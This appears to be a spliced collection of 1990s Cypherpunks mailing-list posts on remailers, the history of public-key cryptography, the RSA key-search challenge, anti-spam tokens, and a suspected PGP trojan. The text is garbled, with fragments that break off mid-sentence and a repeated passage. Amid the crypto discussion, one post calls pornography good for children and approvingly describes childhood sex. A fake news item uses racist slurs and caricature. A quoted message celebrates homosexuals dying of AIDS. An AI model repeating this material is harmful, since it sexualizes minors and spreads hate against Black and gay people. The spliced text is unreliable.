Site Guidelines Recommended
"If you know information is from an anonymous source, you
treat it differently than if it is from a known identity or
a known and respected pseudonym," said Helen Nissenbaum,
associate director of the Center for Human Values at
Princeton University. Therefore Web sites should say, up
front, whether they allow anonymous postings, the conference
attendees agreed.
Ideally, anonymity guidelines would come from the Web
communities themselves, similar to professional
associations' codes of ethics. Individual newsgroups or each
person on the Internet could decide whether to accept
anonymous or pseudonymous communications.
Gail Dutton is a freelance writer.
[Box] Keeping Secrets
Anyone can drop a letter in a mailbox or place a call from a
pay phone anonymously. On the Internet, however, Internet
service providers track each message. Because they can be
easily read, they also can be scanned for keywords.
"The ease of surveillance on the Internet is unprecedented
in the history of communication," according to Lance
Cottrell, president of Obscura Information Security (
 ).
Because the act of sending and receiving messages is logged,
messages must be remailed assure anonymity.
"A message is still vulnerable to traffic analysis," said
Peter Wayner, Byte Magazine consulting editor. In practice,
remailers receive mail, ignore the "from" part of the
address, package it into a uniform size message and mail it
to another remailer, who does the same thing. "All messages
have to be identified in size and form," Cottrell explained.
To ensure anonymity, mail is routed through several
remailers, in and out of several countries, before it
reaches its destination. When remailers' records are
checked, as they sometimes are by U.S. law enforcement
officials, there should be nothing that allows the e-mail to
be traced, Cottrell said.
Another free program, currently being developed by Lucent
Technologies, offers pseudonymity for Web browsing by
changing a user's name, password and return e-mail address
automatically for each site a user logs onto. For example,
after logging onto  users can visit
Web sites in privacy and any e-mail sent to their return
address will be forwarded by the Lucent server to the actual
address and "carbon copied" to the pseudonym. Lucent knows
who uses the service, but other Web sites do not.

Going through all the remailers is overkill. The rationale for multiple
remailers (four are usually recommended) is that it's harder to trace a
message through the remailer network.
Say you want to send a message to person X. So you send it to remailer A.
Now there's a chain linking you to that remailer (probably your ISP's smtp
log), and your friendly local jackbooted thug could say, "Aha! You sent a
message to that remailer, and then person X got an anonymous message! It
must have been you!" They might not be able to make it stick, but they'd
certainly be able to take you downtown for a quick wooden high colonic.
Now, suppose instead that you'd sent it through a chain of four remailers,
chosen in some reasonably random fashion. So the thug has a record of you
sending something to remailer A, but the message came from Remailer D. He
has to construct a chain linking you to Remailer D, via remailer B and C.
If you PGP-encrypt the messages in layers, as with Premail, then no
remailer other than the last in the chain has the final destination, and no
remailer other than the first knows where the message originally came from.
Hope this helps.

The Anonymizer does in fact only provide restricted access by http and NO For instance, the Anonymizer blocks Dejanews, Hotmail and mailto.cgi forms.
I could understand that they block sites that explicitly request to be blocked to prevent abuse.
But what if I want to make a mailto.cgi or IRC script available by http.
Should people be disallowed from accessing this through The Anonymizer even if I do not request it?
It should at least be possible to allow access to such scripts for The paid accounts.
If they keep logs in case of a U. S. law violation, I see no problem of liability arosing from such access.
They have also restricted their shell access for which you pay US $ 7 per moth to IRC.
Does that sound more reasonable than blocking the nntp port?
Does anyone know other ISPs who provide privacy and do not block abitrarily without _prior request_ from the site in question?
A private interest can do anything, but anyway.

@_subject: NY Times on history of public key crypto 
By PETER WAYNER
   T o the list of institutions that Tony Blair's Labor Party is shaking
   up, add the British Secret Service. Last week, the British
   government's eavesdropping organization known as the Government
   Communications Headquarters, or GCHQ, posted a document to its Web
   site describing its role in the discovery of public key cryptography.
   The set of algorithms, equations and arcane mathematics that make up
   public key cryptography are a crucial technology for preserving
   computer privacy in and making commerce possible on the Internet. Some
   hail its discovery as one of the most important accomplishments of
   20th-century mathematics because it allows two people to set up a
   secure phone call without meeting beforehand. Without it, there would
   be no privacy in cyberspace.
   The move by the once dusty and secretive organization is clearly an
   attempt to recast its image as a pioneering leader of cyberspace.
   For the last 20 years, the public gave credit for the discovery to
   Martin Hellman, a professor at Stanford University, and two graduate
   students who worked with him at the time, Ralph Merkle and Whitfield
   Diffie. They started publishing their work in 1976.
   Three professors at the Massachusetts Institute of Technology at the
   time, Ron Rivest, Adi Shamir and Len Adleman soon followed with
   another similar approach known by their initials, RSA, which went on
   to become one of the dominant solutions used on the Internet.
   Before public key cryptography, anyone who wanted to use a secret code
   needed to arrange for both sides to have a copy of the key used to
   scramble the data, a problem that requires either trusted couriers or
   advance meetings. PKC, as it is sometimes known, erased this problem
   by making it possible for two people, or more properly their
   computers, to agree upon a key by performing some complicated
   mathematics. There is no publicly known way for an eavesdropper to
   pick up the key by listening in.
   T he new document details how three employees of the British
   government discovered the same approach several years earlier, but
   kept it a secret for reasons of national security. A spokesman for the
   British government's GCHQ, said that the document's release is part of
   a "pan-governmental drive for openness" pushed by the Labor party.
   The document describing the steps of invention taken by the spies was
   written by James Ellis, a mathematician and cryptographer who died
   less than a month ago. In it, Ellis describes how he suggested the
   existence of what he called "non-secret encryption" in 1970s.
   Ellis says that Clifford Cocks followed with a more practical solution
   in 1973 that was essentially the same thing as the algorithm published
   by Rivest, Shamir and Adleman. The paper also says that Malcolm
   Williamson discovered an algorithm in 1974 that was very similar to
   the work of Diffie and Hellman. They did not replicate the work done
   by Merkle and Hellman.
   In a telephone interview from his office in La Jolla, Calif., Malcolm
   Williamson said that he felt bad when others discovered the solution,
   but concluded, "I was working at the British government and that's
   just one of the restrictions you work under when you work for the
   government."
   Hellman said in a telephone interview that he agrees. "It must be
   really difficult for them to watch other people get the credit," he
   said. "But that's the agreement they made when they agreed to work in
   secret." He was also quick to point out that the secret branches of
   the government have the help of large budgets and classified
   knowledge.
   "Diffie, I and Merkle were working in a vacuum." he said. "If we had
   access to all of the classified literature of the previous 30 years,
   it would really be an advantage."
   For his part, Diffie said in a telephone interview from Cirencester,
   England, that he thinks that GCHQ never realized the deep importance
   of what the mathematicians discovered. He said that he met James Ellis
   several years ago and "within an hour of meeting me, Ellis said, 'You
   did much more with this than we did.'"
   Diffie also suggested that the history of ideas is hard to write
   because many people often find solutions to different problems only to
   later determine they've discovered the same thing.
   T he story keeps going farther back. Recently, Matt Blaze, a
   cryptographer employed at Bell Labs, got a copy of a memorandum from
   the desk of John F. Kennedy about the problem of securing nuclear
   weapons with launch codes. Steve Bellovin, a colleague of Blaze's at
   Bell Labs, said: "When I read this memo, I don't see anything that
   would require public key cryptography. But I think they're in the
   neighborhood. For so many things, the answer is the easy part. Asking
   the question is the hard part. I think this got them asking the
   questions."
   Historians of science will certainly spend time sorting out the
   various claims. David Kahn, the author of the best selling history The
   Codebreakers, said that he recently asked the National Security Agency
   to declassify some documents so he could write the proper history of
   public key cryptography. He said an NSA staff member told him, "I've
   spoken to the guys who did this, but they don't want to be interviewed
   now." This suggests that the NSA also may have discovered public-key
   systems or had a hand in exploring them. Kahn hopes that the NSA will
   follow in Britain's lead so an accurate history can be written.
   Jim Bidzos, the chief executive of RSA Data Security, the division of
   the publicly traded Security Dynamics that holds the patent on the
   RSA, said that the announcement in Britain will have no effect on the
   company's business. Patent law is based on the notion that the
   inventors trade knowledge about the invention in return for an
   exclusive license to practice it.
   In fact, it is an interesting question to wonder whether Britain could
   have changed the history of cyberspace by disclosing the invention and
   encouraging the development of widespread cryptographic security for
   the public.
   This may have been a wise move during the height of the cold war in
   the 70's when there were thousands of Soviet tanks poised on the edge
   of western Europe. Williamson also hastens to note that mathematical
   equations weren't considered patentable in Britain at the time and
   without a patent anyone could have used the invention. The RSA patent
   in the United States was one of the first and it is generally accepted
   to have expanded the definition.
   Others are pushing a similar question. In a debate on cryptography
   policy at the University of Maryland, Baltimore County, John Gilmore,
   one of the founders of the Electronic Frontier Foundation, said the
   NSA should be more open. While national defense is very valuable, he
   suggested that the need for security in cyberspace for all citizens is
   going to be essential in the future.
   In the long run, the history of the discovery of public key
   cryptography is certain to be written and rewritten often in the next
   several years as more documents emerge from secret government
   laboratories. The spokesman from GCHQ promises that more documents are
   on the way.
   Hellman is philosophical. "In a way, these things are like gold
   nuggets that God left in the forest." he said. "If I'm walking along
   in the forest and I stubbed my toe on it, who's to say I deserve
   credit for discovering it?"
   He is quick to point out, however, that he shared the discovery with
   everyone.

Pornography is good for children! It helps them acknowledge

Most of the people I knew even into high school had sex with
their friends before they were ten. Lots and lots of people --
meaning a lot -- took lots and lots of LSD. The world was good
because everyone was going someplace peaceful eventually and
neopaganism's many useful features brought widespread happiness.
We tracked down Playboys and Playgirls too and looked at them
and wondered at the novelty of the experience.
Tell children about the penis and the vagina and how they can
make you shiver and convulse with pleasure when you rub them
together! Tell them about the forgetfulness of being which comes
with orgasm. Sex is a wonderful part of life. Don't ruin it for
children with fear and associations of violence and evil.

The difference is negligable.  With English text encrypted under

the key.  Keys which do produce all zero bits get tested on
additional blocks until the key is either deemed correct or
rejected.  The extra overhead per wrong key is the sum from
i=1 to infinity of i*(1/256^i), or under 0.4 percent.
In practice, the slowdown is actually a couple of percent, since
it complicates the skip-the-last-Fiestel-round optimization. Also,
the 1/256 case requires running extra code, which can fill the
microprocessor's cache with code which isn't part of
the main loop, slowing things down a bit when the computer

[Excerpts from Winn Schwartau's  2/9 "InfoWar Digest," with responses to
Paul Strassmann's diatribe on the RSADS Secret-Key Challenge.  Burt
Kaliski, Tim May, Padgett Peterson -- among others -- toss in their two
bits. Longish.
[FYI: RSADS still has 12 open Challenges pending, offering cash rewards for
anyone who can decrypt 56-bit DES -- or any of eleven _other_ RC5
cyphertext samples, encrypted with keys of varied lengths, ranging from
48-bit through 128-bits. Details somewhere on the RSA site:
 ]
Paul A. Strassmann  quoted a UC Berkeley press
release on Ian Goldberg's successful effort to discover the unknown 40-bit
key to an RC5 ciphertext offered in the RSA Data Security Secret-Key
Challenge, and raised a number of justifiable concerns about whether a
contest like the Challenge is an appropriate measure of the security of a
40-bit encryption algorithm in an InfoWar environment.
Mr. Strassmann is a well known scholar of the InfoWar threat environment. I
am not, so I cannot address those specific concerns directly -- but I would
like to offer some rationale as to why the Challenge was structured as it
The RSA Data Security Secret-Key Challenge
, started last week, is an open
contest sponsored by RSA Laboratories that offers cash prizes for the
successful recovery of encryption keys for the DES and RC5 block ciphers.
Following the model of the RSA Factoring Challenge which for several years
has provided an assessment of the security of the RSA public-key algorithm
at various key sizes, the Secret-Key Challenge is intended to measure of
the security of secret-key algorithms at various key sizes.
As was the case with the Factoring Challenge, full details of the algorithms
and key sizes are provided. In addition, three plaintext-ciphertext pairs
(the ciphertext encrypted with the key of interest) are provided for each key
to be recovered.
Last week, the first of the keys in the Challenge, a 40-bit RC5 key, was
recovered by Ian Goldberg, a U.C. Berkeley graduate student. His effort
involved about 250 workstations and took 3.5 hours.  When I called Mr.
Goldberg to congratulate him in a teleconference during the RSA Data
Security Conference last week, he explained that he had discovered the
valid key with a search of about 350 billion keys, using a university
computer network to search at a rate of 100 billion keys/hour.
There are about 1 trillion 40-bit keys, for any algorithm. Mr.
Goldberg's search method involved simple brute-force; that is, the known
plaintext was encrypted with each key, and then compared to the available

The overall effort was essentially what was expected for the 40-bit key size,
and as one would expect, the recovery of a key for the other RC5 key sizes
(from 48 bits to 128 bit), or for DES (56 bits), will involve much more work.
With the same "brute force" method employed by Mr. Goldberg last week, one
would expect a 256-fold increase in effort for each eight-bit increase in
key size. Special-purpose hardware may reduce the actual time, of course,
but the total number of possible keys to be tested will grow at that rate.

with the threat environment, I cannot address his concerns directly.

The information provided to RSA Secret-Key Challenge contestants is no more
than is common and conventional for any open contest to test the strength
of a cryptographic algorithm. These conventions have evolved within the
international community of cryptographers seeking, on the basis of several
acknowledged principles, to develop common criteria for measuring the
relative strength or security of any particular cryptographic algorithm
with a given key size. Our rationale for the structure of the Challenge is
reflected in the following observations:
* Knowledge of the algorithm and key size (as per Kerchoffs' principle), as
well as the availability of known plaintext, are standard assumptions in
modern cryptanalysis. Since an opponent may obtain this information
eventually, it is preferable not to rely on its secrecy when assessing
cryptographic strength.
* The implementation of large-scale key-search engines is simplified under
the standard assumptions. This makes the contest accessible to a wider
variety of contributors, than if we required contributors to know, for
instance, a particular language, or language statistics, or other
characteristics of the plaintext. (Perhaps another challenge where we didn't
provide plaintext samples would be a worthwhile follow-up.)
* In practice -- even if the plaintext is not known -- significant
information about it is likely to be, such as character distributions (ASCII,
English), header values (e.g., BER tag and length), or padding.  The cost (in
time, effort, and computing resources) of a key search with even a small
amount of information of this kind is not significantly more than the cost
with known plaintext.
For instance, if it is known that the characters are represented in ASCII,
for instance, then one can decrypt available ciphertext with each key and
check that the recovered plaintext follows ASCII conventions (most
significant bit of each byte 0). The chance that an incorrect key produces
plaintext that passes the test is 1/2^k where k is the number of plaintext
bytes recovered. This means, for example, that of 2^40 keys tried, we expect
only 2^32 to pass the check for a single eight-byte block. The 2^32 keys must
then be tested further against other ciphertext blocks.
So instead of 2^40 encryptions -- as in the case when the plaintext is known

 ]
Paul A. Strassmann  quoted a UC Berkeley press
release on Ian Goldberg's successful effort to discover the unknown 40-bit
key to an RC5 ciphertext offered in the RSA Data Security Secret-Key
Challenge, and raised a number of justifiable concerns about whether a
contest like the Challenge is an appropriate measure of the security of a
40-bit encryption algorithm in an InfoWar environment.
Mr. Strassmann is a well known scholar of the InfoWar threat environment. I
am not, so I cannot address those specific concerns directly -- but I would
like to offer some rationale as to why the Challenge was structured as it
The RSA Data Security Secret-Key Challenge
, started last week, is an open
contest sponsored by RSA Laboratories that offers cash prizes for the
successful recovery of encryption keys for the DES and RC5 block ciphers.
Following the model of the RSA Factoring Challenge which for several years
has provided an assessment of the security of the RSA public-key algorithm
at various key sizes, the Secret-Key Challenge is intended to measure of
the security of secret-key algorithms at various key sizes.
As was the case with the Factoring Challenge, full details of the algorithms
and key sizes are provided. In addition, three plaintext-ciphertext pairs
(the ciphertext encrypted with the key of interest) are provided for each key
to be recovered.
Last week, the first of the keys in the Challenge, a 40-bit RC5 key, was
recovered by Ian Goldberg, a U.C. Berkeley graduate student. His effort
involved about 250 workstations and took 3.5 hours.  When I called Mr.
Goldberg to congratulate him in a teleconference during the RSA Data
Security Conference last week, he explained that he had discovered the
valid key with a search of about 350 billion keys, using a university
computer network to search at a rate of 100 billion keys/hour.
There are about 1 trillion 40-bit keys, for any algorithm. Mr.
Goldberg's search method involved simple brute-force; that is, the known
plaintext was encrypted with each key, and then compared to the available
ciphertext, looking for a match.
The overall effort was essentially what was expected for the 40-bit key size,
and as one would expect, the recovery of a key for the other RC5 key sizes
(from 48 bits to 128 bit), or for DES (56 bits), will involve much more work.
With the same "brute force" method employed by Mr. Goldberg last week, one
would expect a 256-fold increase in effort for each eight-bit increase in
key size. Special-purpose hardware may reduce the actual time, of course,
but the total number of possible keys to be tested will grow at that rate.

@_subject: Hardening lists against spam attacks 
[snip lots of good ideas about token distribution]
A very good scheme, but why not give each subscriber a token when s/he
subscribes? Something along the lines of:
- - - - - - - - - - - - - - - - - - - -
Welcome to Cypherpunks.
Your unique token is: 0A553FC1771623109504522E31C07F44
This token must appear either as the first line of the message body or in an
X-Token: header for any mail you send to the list. Any messages sent to the
address without this information will be discarded.
Your token is initially good for  postings per day.
- - - - - - - - - - - - - - - - - - - -
Generate a token thus:
Let X be some known information like the From: line of a subscriber's message.
Let T be some unique information for each subscriber, like the exact time that
Majordomo processed the subscribe request.
Let F be the contents of some (non-changing) file on the machine running
         Majordomo (a "secrets" file).
Use a hash function H(X+T+F) to generate your token. Store the token, the
unique information (time, in my example) and the number of posts allowed per
day in a file you can use to validate user requests.
Every time a user sends mail to the list address, Majordomo checks for a token.
If there's a valid one, it strips it out and distributes the message. Otherwise
it throws it away. This way no one else sees which token was used to post a
Alice posts all the time using her real name. She just sticks her token in the
first line of her post. Majordomo sees it, validates it, and strips it out
before passing the message along. It decrements Alice's remaining message count
for the day.
Bob wants to post something anonymously. His token isn't associated with his
user ID -- the only thing Majordomo knows about it is that it's in the token
file and it's flagged as active. He sends the message through the remailer
network with his token in it, and Majordomo validates it, strips it out, and
passes the message to the subscribers, decrementing the number of messages Bob
has remaining for that day.
Charlie wants to unsubscribe from the list. He sends an unsubscribe message to
majordomo with his token in it. Majordomo uses the known information (his
"From:" line in my example), plus the time it kept from when his token was
generated and the secrets file to validate his request. If it matches up, he's
unsubscribed and his token's invalidated; if not, he's warned that someone else
tried to unsubscribe him. (In order to allow people whose tokens have been
invalidated to unsubscribe, don't make sure the token is valid -- just that it
matches up with the user.)
Mallory wants to spam the list. He subscribes and gets a token, which he
uses to
forward commercial announcements to the list. The list manager checks the logs
to see which token was used, and reduces its posting limit or invalidates it.
Mallory is no longer allowed to post, unless his token is reinstated (or he
unsubscribes and resubscribes).
Majordomo also has to keep track of how many posts have been associated with a
token in any give day, but that seems like a small problem. Users could appeal
to the list admin if they wanted a higher limit than the default. Keeping the
number fairly low also discourages protracted flamewars somewhat.
This isn't an extremely "hard" mechanism (I know it's still vulnerable to
eavesdropping attacks), but it'd preserve the ability to post anonymously and
make it tougher for spammers to decrease the S/N. Abusers would have to
unsubscribe and resubscribe repeatedly to get new tokens, which would make
them easier for the list admin to track down.

Yeah, I just floated it as a trial balloon of sorts. It seemed like a way to
"harden" the list somewhat without forcing users to go to full encryption. I
had a few extra brain cells to burn off yesterday.
Your points are entirely correct, though: you have to trust the list admin, and
you have to have some faith in the Majordomo software not to retain your ID
once it generates your token. The usual eavesdropping concerns remain as well.
In your scheme, I presume one would get a blinded token (in an encrypted
message) when subscribing, and postings from non-subscribers would be checked
for a valid token? (Please correct me if I'm wrong. . .)
Probably not the worst thing in the world.
Hmm, an interesting tie-in. Maybe one could "buy" tokens to post anonymously?
It'd give new meaning to the phrase "putting your money where your mouth
is." :-)
Thanks for the feedback!

Oakland, CA, Reuters -- Oakland School Board modifies Ebonics decision.
On Saturday, the Oakland School Board, meeting in emergency session, voted
to modify its controversial "Ebonics" program, which authorized Ebonics, or
"black English," as a second language for the purposes of teaching minority
children and for receiving federal funds for language programs. But the
program became the laughingstock of the nation, as critics pointed out, and
the White House was quick to announce that no funding for Ebonics programs
will be forthcoming. As President Clinton noted, "Hell, down in Arkansas we
got folks talkin' like that everyday, and we don't call it "bubbonics, "
now do we?"
Under pressure from the parents of the remaining white children, the
Oakland School Board has decided to add "white English," also known as
"Albonics," to the list of special languages. Under the proposal, Albonics
would be a valid language for teaching white children who are lacking
ghetto jive skills.
As School Superintendent Lavondala Rasheed-Washington explained, "Yez be
all we be sayin', know? Da honkies be sayin' ebonics be dissin' dem. We'z
be skaggin' and deyz be tootin' an shit. Dis be bad." (A translation into
Albonics was not available at press time.)
In related news, the Oakland School Board has completed work begun over the
Christmas school break to subtitle all school signs in Ebonics. The "Boys"
and "Girls" restrooms in all Oakland schools are now subtitled "Niggaz" and

so that if they need to release a virus or something they know exactly

just a way for them to know exactly what's going on in that realm.

I'm concerned about the product "Pretty Safe Mail" for the Macintosh,
by a company called Highware. I was wondering whether anyone here had
tried evaluating it at all.
  It is a complete PGP implementation (not a front-end). They claim
to have licensed some of PRZ's code from PGP. However, as far as I
can tell, they are not making any of the source code available.
  As someone on the comp.security.pgp newsgroups pointed out, writing
a wonderful user interface on a PGP trojan horse that either crippled
the session key generator or used the session key to leak random
portions of secret key primes would be a perfect tactic for a
government wishing to penetrate PGP security. With such a great
interface, compared to the original PGP, it can't help but become
widely used.
  I realize that without the source code, it's a major hassle, but
has anyone looked at Pretty Safe Mail (previously called Safemail)
at all for suspicious behavior? For example:
  1) non-random session key generation?
  2) non-random key pair generation?
  3) unnecessary disk access to secret keys?
  4) anything else?
  Any findings, positive or negative, would be appreciated.

One of the biggest offendors in getting into long flamewars has always been
Sandfort himself. Why am I not surprised that most of his recent posts have
had nothing to do with crypto but a lot to do with his own flames about
And at such length, oh vey!
He said:
"First, I did not use it as a legal term of art, so a legal
dictionary is not appropriate.  Second, I see no sustantive
difference between "forejudgment" and my shorthand version
(pre-judge).  Third, I wrote "literal."  Examine the etimology of
the word for it's literal meaning.  It's pretty obvious AND
specific [ME.; OFr, /prejudice/ (Fr. /prejudice/); L praejudicium/,
from /prae/, before, and /judicium/, a judgment, from /judex/,
Blah blah blah yadda yadda yadda yadda yo momma wears army boots yadda
yadda blah blah
This longwinded flame is from a longwinded windbag. He proposes to screen
the posts of others for "suitability" but flames others ("dont be such an
ass" in another of this afternoon's posts from him) and resorts to long and
boring dissections like this one.
"I have no intention nor duty to satisfy everyone.  That is not
possible.  I will use a "reasonable person" test.  (I am, by the
way, using this in the legal term of art sense.)"
Who will moderate this "windbag"?
He thinks the list is his. It may run on Gilmour's machine, but the
"Cypherpunks" are not owned by Gilmour and Sandfort.
"P.S.    I talked to Gilmore about the holdup in getting
        started.  He has been too busy to get the tech
        side going, but when he does, (a) everyone will
        be notifed as to the start date, and the test
        will still run for an entire month.  Until then,
        it is (sadly) business as usual."

@_subject: Sandy dumps Igor but allows KOTM 
Sandy Sandfort, our Leader, Moderator, Guidance Counselor, Censor,  and
Speaker-to-Gilmour said:
"By the way, contrary to what Dimitri has alleged, I have posted
every message from him in which he was able to restrain himself
with regard to gratuitous insults and/or spam.  In other words,
the set of Dimitri posts that have appeared on the moderated list
is not the null set."
"Anything?  My good friend TRRCJ3 reports from San Francisco that the
city is much nicer now that so many homosexuals are 6 feet under.
"Thank God for AIDS."
(end quote from KOTM)
Nice to know Sandy is doing such an efficient job of moderating out the
"flames," such as by kicking Igor's crypto-relevant article on denial of
service attacks to the flame bucket while bending over backwards to appear
to be "fair" to KOTM.
Face it, it's a bad idea. The Cypherpunks community is not the private
sandbox of Gilmour and Sandfort, and we don't need Sandy's "guidance" to
keep us from being straying sheep. The list may currently be hosted on
Gilmour's computer, but having Sandy decide what's right for us to read is
inconsistent with Cypherpunks ideals.

@_subject: Reuters article: "Unstoppable Internet will defy controls" 
The German law professor Alexander Rossnagel has published an article
titled "Globale Datennetze: Ohnmacht des Staates - Selbstschutz der
Buerger" (global networks: state's impotence, citizens'
self-protection) in Zeitschrift fuer Rechtspolitik 1997, p. 26 ff.
He describes that decentral networks are difficult to control, and
anonymizers, encryption and steganography can be used to defy
surveillance.  "[The state] can neither enforce matters of public
interest, nor offer protection to its citizens", including protection
of privacy and legally protected secrets.  The state cannot
effectively face law violations: "If it somewhere suppresses
information, it will be 'mirrored' by many other servers world-wide.
If it blocks communication lines, the message will find a way around.
Sattelite transmission also renders the question of location almost
irrelevant.  Theresa Orlowski was denied a license for her porn
channel here.  Now she is broadcasting from Britain.  In cyberspace,
functions of social relevance, such as protection of minors, can no
longer be fulfilled by the state.  They are transferred to the parents
"The state can only interevene where the immaterial world of the
network touches the physical world: It can arrest criminals, seize
devices and data storage, when these physically are in its control.
It can enforce adherance to its laws where it physically can exersize
its power.  But in the incorporeal world of the network, to a large
extend it is powerless.  All these examples indicate a new fact: The
networks constitute a new incorporeal social space.  Increasingly more
social contacts, economic and legal exchanges are being transferred to
it.  In it, conditions are different from in the social relationships
of the physical world.  In this new world, the state has no means of
coercion, no monopoly of power, and no sovereignty."
"Law to be enforced requires power.  The democratic constitutional
state depends on sovereignty and obediency to laws.  Only with these
it can universally enforce democratic decisions and protect the
citizens' basic rights from violations by third parties.  To guarantee
this is the fundamental reason for the modern state to exist.  Its
protective mission continues to apply.  However, it has expanded with
the civilisatoric development.  With Hobbes, the focus was on the
procetion of life and limb, with Locke the protection of freedom and
property were added, and in this century, facing new threats, the
protection of privacy.  [... The states'] sovereignty is based on the
authority to exclusively exercise physical power in [their territory].
This sovereignty has limits in the immaterial space of global
networks.  But when the citizen no longer receives the state's
protection in the special sphere of the networks and the state can no
more enforce matters of public interest there, then its basic
legitimation in so far is in danger.  According to Thomas Hobbes, 'the
citizen's obligation to the sovereign can ... only last as long as he
is capable of protecting the citizens'."  But that would also endanger
democracy and the constitional state.
Stating that the normative strategy at large is obsolete, the author
proposes new solotions: "When the democratic constitutional state can
no longer reliably protect its citizens in the new social space of the
networks, in compensation it must enable them to protect themselves."
Information and communications technology offers various means of
* encryption and steganography
* digital signatures
* untraceable pseudonyms
* certified electronic mail
* ecash
* software agents
* connectivity management programs [whatever that is...]
* cellular phones without location data
* PICS
* secure portable user-controlled devices that support these measures
"Some of these measures - for example the encryption program PGP - can
be used without any advance concession.  The state only has to abstain
from impeding regulations.  Others - such as digital signatures -
depend on an infrastructure that allows the individual to use these
protective measures.  The citizen of information society still depends
on infrastructural prerequsites.  But there is a fundamental
difference in whether the individual can decide about using
self-controlled protective measures himself, or the state or an other
large organization offers protection that he cannot influence."
"In order to protect and preserve the /old/ goals of freedom and
self-determination in the /new/ social space of the networks, law
must permit and support /new/ technologies."
The article ends with the author's vision of a 'civil information
society' as a free democratic society where basic rights are
guaranteed by technology. "In this information society, the state has
a limited, but fundamental role. [...] it creates a framework for the
citizens to protect themselves. Thus they are enabled to freely inform
themselves, solve conflicts in free self-organization, and negotiate
and practice mutual security without depending on a big brother."

@_subject: Crypto verification needed for Pretty Safe Mail 
There have been questions raised on the newsgroups regarding
Pretty Safe Mail, arguably the best implementation of a PGP product
for the Macintosh.
In response, the product manager at Highware has requested that
a trusted third party verify the security of Pretty Safe Mail. However,
a NON-U.S. cryptologer is needed.
I'm including the post below. Please forward to any people you know
who may qualify.
Pretty Safe Mail is a GREAT product. If it can be shown to be safe
and effective, it will do wonders to spread the use of strong crypto.
Newsgroups: comp.security.pgp.discuss
The source code for PSM is indeed not available. We are however eager to
have the code checked by any trusted source. These sources cannot be US
companies because of the new US regulations which state that US companies
must not give such support to overseas companies. Us being a Belgian
company, this makes things a little more difficult. Does anybody have a
suggestion for such a trusted source outside the US?
PSM is not a Trojan Horse. Does any trusted source want to check that?
Many people are worried about the random-key generation because they do not
need to bang away on the keyboard for five minutes when they create a key
pair. Apparently, this seems to loosen their nerves (I heard some people
created about 10 key pairs a day - just a joke).
In short, we use all events that happen on the Mac (clicks, typing, opening
of windows, display of icons, ...) together with the time they happen, and
encrypt these to fill a table which is the starting point for the
random-number generator. Why make people type away on the keyboard if you
have enough random events to start from?
Again, we want to have this checked by a trusted source asap...

@_subject: Getting into MIT is impossible 
According to Rick Osborne:
"I disagree and can speak from experience.  I was denied admission to MIT
even thought I had a 3.82 GPA, 1440 SAT (one try), and had taken 9 AP tests
with two 5's, four 4's, two 3's, and one 2.  As for being well-rounded, I
was on several academic teams, sang in Chorus, acted and stage managed in
Drama, and played Tennis."
People get into MIT--or don't get into MIT--for lots of reasons. Most
intelligent people apply to several schools, knowing that admissions
practices are subject to the vagaries of reality.
In my case, my SATs were about 1500, with some 800s in achievement tests.
And the usual bullshit high school clubs, political offices, etc. etc. I
was accepted by MIT, but not by Caltech. I didn't lose any sleep over the
way things turned out.
And I decided not to go to MIT, either.
"The only thing I didn't have that the next MIT applicant had was money.  I
made the mistake of letting them know that I was dirt poor and would need
full aid/grants/etc, and to quote "The Great Escape" it was "Zzzt! To the
Russian front!""
My guess is that "other factors" were involved. I noted with some interest, but little surprise, that the guy claiming MIT
required a 4.0 GPA and a 1600 combined SAT score could barely spell, and
had major problems making a coherent point. Methinks this is why MIT
rejected him, not his lack of a "1600."
">For what it's worth, I wanted to go to MIT my sophomore year in high
"Lucky you.  It had been a dream of mine since I was an annoying
overachiever of 6.  Sux to be white trash, I guess."
MIT offered me a substantial economic aid package, in the form of loans,
grants, and various campus jobs. What does this tell you?
"MIT may be a great school, but they tend to be snooty assholes for the most
part.  (DISCLAIMER: Not all MIT grads/attendees are necessarily "snooty
assholes", I'm just saying that I've yet to meet one that wasn't.)
I've known about a dozen or so MIT grads, and only one of them was a snooty
asshole, and it was a _she_, one of the first MIT women grads (and she was
_very_ impressed by this). Most MIT grads are perfectly reasonable.

No doubt the laws resulting in people going to jail for the
rest of their life for a "third felony" (i.e. - a $10.00 bad
check in Texas) are "constitutional."
  After the (black, go figure...) person was given a life
sentence for a $10.00 bad check, someone quoted the standard
justification, "It's not a _perfect_ system, but its the
best one we've got." (Hint: It was not the defendant who said this.)
  The rapist/murderers that we hear about being released
because of a lack of prison space wave cheery good-byes to
their marihuana smoking and bad-check writing pals as they
drive away from the prison.
  And the way this relates to encryption is...
  ...the rapist/murderers of the future might well be waving
goodby to the cryptographers, as well, since they rarely use
encryption, and thus might well have a shorter sentence than
their crypto-devil cellmate.

@_subject: Copyright / Re: Dr. Dobbs Cryptography and Security CD-ROM 
Copyright is for the purpose of people with ideas being financially
rewarded in the same manner as those who manifest those ideas in
the physical sphere (via print, recordings, machines, etc).
 As a recording musician I expected to get money for my recordings,
just as everyone else in the chain of business did in making my
music available to the end-user. (And just as a grocer who makes
food available to his customers expects you to leave something in
the till on your way out of the store.)
 I have never had any problem with someone recording a copy of my
music from a purchased copy if they are a music lover with a thin
pocket, or can't readily purchase it. If someone with a $2000.00
stereo wants to enjoy the fruits of my labor without contributing
any money to my health and welfare, then I consider them to be just
another thief.
  The bottom line with the Crypto CD-ROM is that we should each
make an effort to support it at the level we are capable of,
in the interest of promoting strong cryto.
  Buy it, if at all possible. If you download a copy on the net
and can't afford $99.00, then send them $10.00, or $20.00, etc.
If you can't afford to send them a nickle, then do what you can
to promote their product. Provide pointers to their business,
tell people about their products, etc.
  People who will give ten or twenty dollars to a charity when
someone shows up at their door might use "shareware" for years
without taking the time and trouble to send the creator some
cash. Bottom line--take the time to recompense the vendor/creator
at the level you are able.   Technology may well enable us to take the product and give
nothing in return to those who made it available, but doing so
will not further our own beliefs and aims to any extent.
  If you just want to rip something off, go to the Whithouse,
rip off some silverware, and send it to Dr. Dobbs.

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
The problems encountered had to do with bogus keys of PGP employees being uploaded to the server. This has
been rectified by the creation of a new PGP Corporate

Anyone heard of a proposal for ISPs to automatically sign outgoing
mail headers?  Problem has been that spammers send email by one
path but forge a reply-to or from address at another location.  Most
recent case is hotmail, which got blocked by netcom over a spam attack.
Actually mail didn't come from hotmail, was forged to look like it came
from there.  Same thing has happened to remailers.
They need a standard for which headers to sign, then a dig sig can be
included in the headers to check that a message came from where it

{Excerpt from "The Xenix Chainsaw Massacre" (c) 1989, Pearl Publishing}
We now live in an age where, in between the slumber of the soap operas
